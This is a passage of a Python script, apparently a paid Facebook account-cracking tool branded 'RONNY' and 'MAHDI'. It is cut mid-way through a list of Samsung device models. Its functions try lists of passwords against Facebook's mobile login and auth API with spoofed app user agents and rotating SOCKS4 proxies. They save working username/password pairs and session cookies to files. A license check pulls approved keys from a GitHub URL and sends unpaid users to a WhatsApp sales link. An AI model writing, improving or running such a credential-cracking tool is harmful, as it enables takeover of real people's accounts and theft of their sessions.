5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
tan=('https')
application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
application_version_code=str(random.randint(000000000,999999999))
fbs=random.choice(fbks)
gtt=random.choice(xxxxx)
gttt=random.choice(xxxxx)
android_version=str(random.randrange(6,13))
ugent = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'



def api1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for pas in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            adid = str(uuid.uuid4())
            data = {'adid':adid,
                        'email':uid,
                        'password':pas,
                        'cpl':'true',
                        'credentials_type':'device_based_login_password',
                        "source": "device_based_login",
                        'error_detail_type':'button_with_disabled',
                        'source':'login','format':'json',
                        'generate_session_cookies':'1',
                        'generate_analytics_claim':'1',
                        'generate_machine_id':'1',
                        "locale":"es_CU","client_country_code":"CU",
                        'device':gtt,
                        'device_id':adid,
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            head = {
                        'content-type':'application/x-www-form-urlencoded',
                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                        'x-fb-connection-type':'unknown',
                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'user-agent':ug,
                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                        'x-fb-connection-quality':'EXCELLENT',
                        'x-fb-friendly-name':'authenticate',
                        'accept-encoding':'gzip, deflate',
                        'x-fb-http-engine':     'Liger'}
            url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                        print(f'\r\r\033[1;32m [RONNY-OK] '+uid+' | '+pas+'\033[1;97m')
                        open(f'/sdcard/RONNY-OK.txt','a').write(uid+'|'+pas+'\n')
                        #cek_apk(session,coki)
                        oks.append(uid)
                        break
            elif 'www.facebook.com' in q['error']['message']:
                        print(f'\r\r\x1b[38;5;126m [RONNY-CP] '+uid+' | '+pas+'\033[1;97m')
                        open(f'/sdcard/RONNY-CP.txt', 'a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
                        break
            else:
                 continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}MAHDI{x}]-{uid}-[%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except requests.exceptions.ConnectionError:
            time.sleep(10)
    except Exception as e:
            pass


    
##############################################################################
def mex():
    imt = '=MAHDI=MEX='
    os.system('clear')
    print (logo)
    
    try:
        key1 = open('./.android3.txt', 'r').read()
    except IOError:
        os.system('clear')
        m = input('INPUT YOUR NAME : ')
        print (logo)
        print ('         FUCK YOUR BYPASS SYSTEM')
        print ('\x1b[1;92m        You dont have subscrption')
        print ('          This is paid command so need to aprove')
        print ('\033[1;92m         If you want to buy presh enter')
        print ('')
        myid = uuid.uuid4().hex[:10]
        print ('         YOUR KEY :\033[1;93m ' + myid + imt+m)
        kok = open('./.android3.txt', 'w')
        kok.write(myid + imt+m)
        kok.close()
        print ('')
        input('   \x1b[0;34mMIVIDIANA TOLOTRA ')
        os.system('am start https://wa.me/+261341309816?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDi%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://raw.githubusercontent.com/Sakate-User/Ronny-/main/ap.txt').text
    if key1 in r:
        print("\33[1;32mYour Token is Successfully Approved")
        time.sleep(0.5)
        mahdistr()
    else:
        os.system('clear')
        print (logo)
        print ('         FUCK YOUR BYPASS SYSTEM')
        print('')
        print ('         You dont have subscrption')
        print ('         THIS IS PAID COMMAND ')
        print ('')
        print ('         YOUR KEY : \033[1;93m' + key1)
        print ('')
        print ('        \x1b[0;34mIF YOU BUY TOOLS CONTACT ME')
        print ('')
        input('\033[1;92mIf you want to buy presh entero ')
        os.system('am start https://wa.me/+261341309816?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDi%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
##################
                        
def rcrack(uid,pwx,tl):


    global loop


    global cps


    global oks


    global proxy


    try:


        for ps in pwx:
            ug = random.choice([M1,A2,H3,D4,I4,ax,bx])
            m = random.choice(my_color)
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            su = random.choice([m,k,xr,u,b])
            bi = random.choice([P,M,K,B,U,O,N,H])
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r[\033[1;92m{su}RONNY\033[1;97m][{bi}{uid}\033[1;97m][%s/%s][OK\033[1;97m:\033[1;92m%s\033[1;97m/CP\033[1;97m:-\033[1;91m%s\033[1;97m]\r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()

            free_fb = session.get('https://mbasic.facebook.com').text

            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),


            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),


            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),


            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),


            "try_number":"0",


            "unrecognized_tries":"0",


            "email":uid,


            "pass":ps,


            "login":"Log In"}
            params = {
			    'refsrc': 'deprecated',
			    'lwv': '100',
			    'ref': 'dbl',
			}


            header_freefb = {
            'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
		    'cache-control': 'max-age=0',
		   
		    'origin': 'https://mbasic.facebook.com',
		    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
		    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'same-origin',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
            'user-agent': ug}

            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,params=params,headers=header_freefb).text


            log_cookies=session.cookies.get_dict().keys()


            if 'c_user' in log_cookies:


                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])


                cid = coki[7:22]
                print('\n\033[1;93m--------------[RONNY-OK]--------------\n\x1b[2;91mNUMBER/EMAILðŸ‘‰\033[2;32m:'+uid+'\n\x1b[1;95muidâž£\033[2;32m:'+cid+'\033[1;32m\033[33m   pass:\033[2;32m'+ps+'\n\x1b[0;38m[â€Žâ€ŽCOOKIE]= \033[1;32m'+coki+'\n\033[1;93m'+ug)
                #print(f" Cookie : {coki}")
                open('/sdcard/RONNY-ok.txt', 'a').write( uid+' | '+ps+'\n')
                cek_apk(session,coki)
                follow(session, coki)
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[RONNY-CP] {uid}|{ps}")
                open('/sdcard/RONNY-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;92m{su}RONNY\033[1;97m] [{bi}{uid}\033[1;97m][%s/%s][OK\033[1;97m:-\033[1;92m%s\033[1;97m/CP\033[1;97m:\033[1;91m%s\033[1;97m]\r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()

    except:

        pass


if __name__ == '__main__':
    mex()
    #mahdistr()                                                                                                                                 
